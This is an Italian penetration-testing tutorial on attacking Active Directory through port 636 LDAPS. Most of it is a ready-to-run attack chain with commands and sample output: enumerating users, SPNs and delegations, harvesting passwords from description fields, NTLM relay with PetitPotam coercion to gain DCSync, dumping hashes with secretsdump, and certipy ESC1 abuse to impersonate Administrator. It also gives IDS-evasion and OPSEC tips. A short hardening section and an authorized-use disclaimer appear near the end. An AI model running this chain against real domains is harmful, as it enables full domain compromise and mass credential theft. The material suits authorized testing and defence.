---
title: 'Porta 636 LDAPS: enumerazione Active Directory, certificati TLS e abuse AD CS.'
slug: porta-636-ldaps
description: >-
  Scopri cos’è la porta 636 LDAPS, come il certificato LDAP over SSL può
  rivelare hostname, dominio e CA aziendale, e perché LDAP signing e channel
  binding restano cruciali per ridurre relay ed esposizione della directory
  Active Directory.
image: /porta-636-ldaps.webp
draft: false
date: 2026-04-07T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - ad-cs
  - ldap-channel-binding
---

> **Executive Summary** — La porta 636 espone LDAPS (LDAP over SSL/TLS), la versione cifrata del protocollo di directory usato da Active Directory. A differenza della porta 389 in chiaro, la 636 stabilisce TLS prima di qualsiasi dato — ma l'enumerazione funziona identicamente una volta autenticati (o con anonymous bind). Il certificato TLS rivela hostname interni, dominio AD e Certificate Authority aziendale, aprendo la via per AD CS abuse. Questa guida copre enumerazione AD completa, certificate abuse, credential extraction e NTLM relay verso LDAPS.

```id="f3z8ke"
TL;DR

- LDAPS sulla 636 cifra il traffico ma non impedisce l'enumerazione — con credenziali valide o null bind, estrai tutto AD
- Il certificato TLS rivela hostname interni, dominio AD e CA aziendale — informazioni critiche per attacchi AD CS (ESC1-ESC8)
- Se LDAP channel binding non è configurato (default), NTLM relay verso LDAPS permette escalation a DCSync

```

Porta 636 LDAPS è il canale TCP su cui Active Directory espone il servizio di directory con cifratura TLS nativa. La porta 636 vulnerabilità non è nel TLS in sé, ma nell'informazione esposta: enumerazione completa di utenti, gruppi, policy, SPN e configurazione AD. L'enumerazione porta 636 è identica a quella sulla 389, con il vantaggio che il traffico cifrato evade gli IDS. Nel LDAPS pentest, l'obiettivo è estrarre la massima quantità di informazioni per alimentare Kerberoasting, AS-REP Roasting, delegation abuse e ACL attack. Nella kill chain si posiziona come recon AD e vettore per privilege escalation via certificati e deleghe.

## 1. Anatomia Tecnica della Porta 636

La porta 636 è registrata IANA come `ldaps`. LDAPS stabilisce TLS prima di qualsiasi scambio LDAP — a differenza di STARTTLS sulla 389, dove il TLS è un upgrade opzionale.

| Porta                                   | Protocollo | TLS                | Scope               |
| --------------------------------------- | ---------- | ------------------ | ------------------- |
| [389](https://hackita.it/articoli/ldap) | LDAP       | STARTTLS opzionale | Dominio singolo     |
| **636**                                 | **LDAPS**  | **Implicit TLS**   | **Dominio singolo** |
| 3268                                    | GC         | STARTTLS opzionale | Foresta intera      |
| 3269                                    | GC-SSL     | Implicit TLS       | Foresta intera      |

Il flusso LDAPS:

1. Client si connette alla 636 → handshake TLS immediato
2. Il certificato rivela CN (hostname), SAN (domini), issuer (CA)
3. Client esegue bind (anonymous, simple user/pass, SASL/Kerberos)
4. Query LDAP identiche alla 389 — utenti, gruppi, SPN, deleghe, ACL

```
Misconfig: Anonymous bind abilitato
Impatto: enumerazione AD completa senza credenziali
Come si verifica: ldapsearch -x -H ldaps://[DC]:636 -b "DC=domain,DC=com" "(objectClass=user)"
```

```
Misconfig: LDAP channel binding non configurato (default Microsoft)
Impatto: NTLM relay verso LDAPS → escalation a DCSync
Come si verifica: crackmapexec ldap [DC] -u user -p pass -M ldap-checker
```

```
Misconfig: Password nei campi description degli utenti AD
Impatto: credenziali in chiaro estraibili via query LDAP
Come si verifica: ldapsearch ... "(description=*pass*)" sAMAccountName description
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 636 10.10.10.10
```

**Output atteso:**

```
PORT    STATE SERVICE  VERSION
636/tcp open  ssl/ldap Microsoft Windows Active Directory LDAP
| ssl-cert: Subject: CN=DC01.corp.local
|   Subject Alternative Name: DNS:DC01.corp.local, DNS:corp.local
|   Issuer: CN=corp-DC01-CA, DC=corp, DC=local
|   Not valid after: 2027-03-15
```

**Cosa ci dice questo output:** il server è `DC01.corp.local` — un domain controller. Dominio AD `corp.local`. CA interna `corp-DC01-CA` — informazione fondamentale per [attacchi AD CS](https://hackita.it/articoli/active-directory).

### Comando 2: Estrazione certificato completa

```bash
openssl s_client -connect 10.10.10.10:636 -showcerts </dev/null 2>/dev/null | \
  openssl x509 -noout -subject -issuer -ext subjectAltName
```

**Output atteso:**

```
subject=CN = DC01.corp.local
issuer=DC = local, DC = corp, CN = corp-DC01-CA
X509v3 Subject Alternative Name:
    DNS:DC01.corp.local, DNS:corp.local
```

**Cosa ci dice questo output:** SAN conferma hostname e dominio. L'issuer rivela la CA interna — target per certipy/Certify.

## 3. Enumerazione Avanzata

### Test anonymous bind

```bash
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://10.10.10.10:636 -b "" -s base namingContexts
```

**Output (funziona):**

```
namingContexts: DC=corp,DC=local
namingContexts: CN=Configuration,DC=corp,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=corp,DC=local
```

**Output (bloccato):**

```
ldap_bind: Invalid credentials (49)
```

**Lettura dell'output:** se restituisce i namingContexts, anonymous bind attivo — enumeri senza credenziali. Il base DN è `DC=corp,DC=local`.

### Enumerazione utenti completa

```bash
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://10.10.10.10:636 -D "user@corp.local" -w "Pass123" \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf description userAccountControl
```

**Output:**

```
dn: CN=John Smith,OU=IT,DC=corp,DC=local
sAMAccountName: j.smith
memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local
description: Temp pwd: Welcome2025!

dn: CN=SQL Service,OU=ServiceAccounts,DC=corp,DC=local
sAMAccountName: svc_sql
userAccountControl: 66048
```

**Lettura dell'output:** `j.smith` è Domain Admin con password in chiaro nella description — finding critico. `svc_sql` con `userAccountControl: 66048` (DONT\_EXPIRE\_PASSWORD) — service account target per [Kerberoasting](https://hackita.it/articoli/kerberos).

### SPN per Kerberoasting

```bash
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://10.10.10.10:636 -D "user@corp.local" -w "Pass123" \
  -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

**Output:**

```
sAMAccountName: svc_sql
servicePrincipalName: MSSQLSvc/SQL01.corp.local:1433

sAMAccountName: svc_http
servicePrincipalName: HTTP/WEB01.corp.local
```

### Password policy

```bash
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://10.10.10.10:636 -D "user@corp.local" -w "Pass123" \
  -b "DC=corp,DC=local" "(objectClass=domain)" minPwdLength lockoutThreshold lockoutDuration
```

**Output:**

```
minPwdLength: 8
lockoutThreshold: 5
lockoutDuration: -18000000000
```

**Lettura dell'output:** password minima 8 char, lockout dopo 5 tentativi, durata 30 minuti. Regola il [password spray](https://hackita.it/articoli/bruteforce): max 4 tentativi, pausa 31 minuti.

### Deleghe (constrained delegation)

```bash
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://10.10.10.10:636 -D "user@corp.local" -w "Pass123" \
  -b "DC=corp,DC=local" "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo
```

**Output:**

```
sAMAccountName: svc_sql
msDS-AllowedToDelegateTo: CIFS/DC01.corp.local
```

**Lettura dell'output:** `svc_sql` ha constrained delegation verso CIFS del DC — se comprometti questo account, puoi impersonare Domain Admin.

## 4. Tecniche Offensive

**Dump AD completo con ldapdomaindump**

Contesto: hai credenziali di dominio. Dump completo per analisi offline.

```bash
ldapdomaindump -u "corp\\user" -p "Pass123" ldaps://10.10.10.10:636 -o /tmp/ad_dump
```

**Output:**

```
[+] Domain dump saved to /tmp/ad_dump/
    domain_users.html, domain_groups.html, domain_computers.html,
    domain_policy.html, domain_trusts.html
```

**Cosa fai dopo:** analizza gli HTML per trovare admin, service account, trust, deleghe e password in description.

**BloodHound collection via LDAPS**

Contesto: mappatura path di attacco AD.

```bash
bloodhound-python -u user -p "Pass123" -d corp.local -ns 10.10.10.10 --zip -c All --dns-tcp
```

**Output:**

```
INFO: Found 1523 users, 89 groups, 12 computers
INFO: Done in 00:02:15
INFO: Compressing output: 20260206_bloodhound.zip
```

**Cosa fai dopo:** importa in BloodHound GUI → cerca Shortest Path to Domain Admins. Concentrati su Kerberoastable accounts, constrained delegation e ACL abuse. Per la guida completa a [BloodHound e AD attack path](https://hackita.it/articoli/active-directory), consulta l'articolo dedicato.

**NTLM relay verso LDAPS**

Contesto: LDAP channel binding non configurato. Relay autenticazione coerced per escalation.

```bash
# Terminal 1: avvia relay
ntlmrelayx.py -t ldaps://10.10.10.10 --escalate-user compromised_user

# Terminal 2: forza autenticazione dal DC
python3 PetitPotam.py 10.10.10.200 10.10.10.10
```

**Output (successo):**

```
[*] SMBD: Received connection from 10.10.10.10
[*] Relay to ldaps://10.10.10.10
[+] Modified ACL: added DCSync privilege to compromised_user
```

**Cosa fai dopo:** hai DCSync. Esegui `secretsdump.py corp/compromised_user:pass@10.10.10.10` per dumpare tutti gli hash NTLM.

**Certificate abuse (AD CS)**

Contesto: la CA trovata nel certificato LDAPS. Enumeri template vulnerabili.

```bash
certipy find -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 -vulnerable
```

**Output:**

```
[!] VULNERABLE: ESC1 - UserTemplate
    Enrollment: Domain Users
    Client Authentication: True
    Enrollee Supplies Subject: True
```

**Cosa fai dopo:** ESC1 = qualsiasi Domain User può richiedere un certificato come Administrator: `certipy req -u user -p pass -ca corp-DC01-CA -template UserTemplate -upn administrator@corp.local`.

## 5. Scenari Pratici di Pentest

### Scenario 1: AD internal — enumerazione iniziale

**Step 1:** `nmap -sV -sC -p 636 10.10.10.10` → dominio, CA
**Step 2:** `ldapdomaindump` + `bloodhound-python` → mappa completa AD
**Step 3:** Cerca path: Kerberoast → delegation abuse → DA

**Se fallisce:** certificato self-signed → aggiungi `LDAPTLS_REQCERT=never`
**Tempo stimato:** 10-20 minuti

### Scenario 2: [NTLM](https://hackita.it/articoli/ntlm) relay chain

**Step 1:** Verifica channel binding: `crackmapexec ldap [DC] -M ldap-checker`
**Step 2:** `ntlmrelayx.py -t ldaps://[DC] --escalate-user [user]`
**Step 3:** PetitPotam → DCSync

**Se fallisce:** channel binding attivo (EPA) → relay non funziona su LDAPS
**Tempo stimato:** 5-10 minuti

### Scenario 3: External — LDAPS su Internet

**Step 1:** `openssl s_client -connect [target]:636` → cert info
**Step 2:** `ldapsearch -x` → test anonymous bind
**Step 3:** Se funziona → dump completo; se no → cert è già un leak

**Tempo stimato:** 5 minuti

## 6. Attack Chain Completa

| Fase       | Tool           | Comando                                           | Risultato             |
| ---------- | -------------- | ------------------------------------------------- | --------------------- |
| Recon      | nmap/openssl   | `nmap -sV -sC -p 636`                             | Dominio, CA, hostname |
| Bind Test  | ldapsearch     | `-x -b "" namingContexts`                         | Base DN               |
| User Enum  | ldapsearch     | `"(objectClass=user)" sAMAccountName description` | Utenti + creds        |
| SPN Enum   | ldapsearch     | `"(servicePrincipalName=*)"`                      | Kerberoast targets    |
| Full Dump  | ldapdomaindump | `ldaps://[DC] -o /tmp/dump`                       | Tutto AD              |
| Path Map   | BloodHound     | `-c All --zip`                                    | Attack paths          |
| NTLM Relay | ntlmrelayx     | `-t ldaps://[DC] --escalate-user`                 | DCSync                |
| Cert Abuse | certipy        | `find -vulnerable`                                | ESC1-ESC8             |

Leggi la nostra guida principale per sfruttare tutte le esc da 1 a 16 in fase di PrivEsc . [https://hackita.it/articoli/adcs-esc1-esc16/](https://hackita.it/articoli/adcs-esc1-esc16/)

## 7. Detection & Evasion

### Blue Team

* **Event ID 1644**: query LDAP costose (richiede attivazione)
* **Event ID 2889**: bind LDAP senza signing sulla 389
* **MDI**: BloodHound collection, Kerberoasting, anomalous LDAP queries

### Evasion

```
Tecnica: LDAPS per evadere IDS content inspection
Come: traffico TLS sulla 636 è opaco — IDS non vede le query
Riduzione rumore: l'IDS vede solo connessione TLS, non il contenuto
```

```
Tecnica: Query mirate
Come: cerca solo SPN, description, delegation — non "*"
Riduzione rumore: meno query = meno log Event ID 1644
```

## 8. Toolchain e Confronto

| Aspetto      | LDAPS (636) | LDAP (389)    | GC-SSL (3269) |
| ------------ | ----------- | ------------- | ------------- |
| TLS          | Implicit    | STARTTLS/No   | Implicit      |
| IDS evasion  | Alto        | Basso         | Alto          |
| Scope        | Dominio     | Dominio       | Foresta       |
| Relay target | Se no EPA   | Se no signing | Se no EPA     |

## 9. Troubleshooting

| Errore                      | Causa            | Fix                                 |
| --------------------------- | ---------------- | ----------------------------------- |
| `Can't contact LDAP server` | Cert non trusted | `LDAPTLS_REQCERT=never`             |
| `Invalid credentials (49)`  | Auth errata      | Prova `user@domain` o `DOMAIN\user` |
| `Operations error (1)`      | Base DN errata   | Query base: `-b "" namingContexts`  |
| BloodHound SSL error        | CA non trusted   | Ignora cert validation              |
| `Size limit exceeded`       | >1000 risultati  | Usa paging: `--simple-paging 500`   |

## 10. FAQ

**D: Differenza tra porta 389 e 636?**
R: La 389 è LDAP in chiaro (STARTTLS opzionale). La 636 è LDAPS con TLS implicito. Query identiche, cambia solo la cifratura del canale.

**D: LDAPS protegge dal relay NTLM?**
R: Solo se channel binding (EPA) è configurato. Il default Microsoft è "non configurato".

**D: Come proteggere la 636?**
R: Channel binding (`LdapEnforceChannelBinding=2`). LDAP signing obbligatorio. Disabilita anonymous bind. Monitora Event ID 1644.

## 11. Cheat Sheet Finale

| Azione     | Comando                                                                        |
| ---------- | ------------------------------------------------------------------------------ |
| Scan       | `nmap -sV -sC -p 636 [target]`                                                 |
| Cert       | `openssl s_client -connect [target]:636`                                       |
| Anon bind  | `LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://[target] -b "" namingContexts` |
| User enum  | `ldapsearch ... "(objectClass=user)" sAMAccountName description memberOf`      |
| SPN enum   | `ldapsearch ... "(servicePrincipalName=*)"`                                    |
| Delegation | `ldapsearch ... "(msDS-AllowedToDelegateTo=*)"`                                |
| Pwd policy | `ldapsearch ... "(objectClass=domain)" minPwdLength lockoutThreshold`          |
| Full dump  | `ldapdomaindump -u "DOM\\user" -p pass ldaps://[DC]`                           |
| BloodHound | `bloodhound-python -u user -p pass -d dom -ns [DC] --zip -c All`               |
| NTLM relay | `ntlmrelayx.py -t ldaps://[DC] --escalate-user user`                           |
| AD CS      | `certipy find -u user@dom -p pass -dc-ip [DC] -vulnerable`                     |

### Perché Porta 636 è rilevante nel 2026

Ogni DC Active Directory ha la porta 636 aperta. L'enumerazione LDAPS è invisibile all'IDS. Channel binding non è configurato di default. AD CS abuse (ESC1-ESC8) è il path più efficace verso Domain Admin nel 2024-2026. La 636 è obbligatoria in ogni scan interno.

### Hardening e Mitigazione

* Channel binding: `LdapEnforceChannelBinding = 2`
* LDAP signing: GPO → Require signing
* Disabilita anonymous bind
* Rimuovi password dai campi description
* Monitora Event ID 1644

### OPSEC per il Red Team

LDAPS cifra il contenuto — IDS cieco. BloodHound è rumoroso — esegui in orari di punta. Query mirate (SPN, description) sono meno visibili di un dump completo. ldapdomaindump è più silenzioso di [BloodHound](https://hackita.it/articoli/bloodhound). L'enumerazione LDAP con credenziali utente è attività legittima — difficile da distinguere.

***

Riferimento: RFC 4511, RFC 4513, MS-ADTS. Uso esclusivo in ambienti autorizzati. Approfondimento: [https://www.speedguide.net/port.php?port=636](https://www.speedguide.net/port.php?port=636)

> Vuoi supportare HackIta? [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
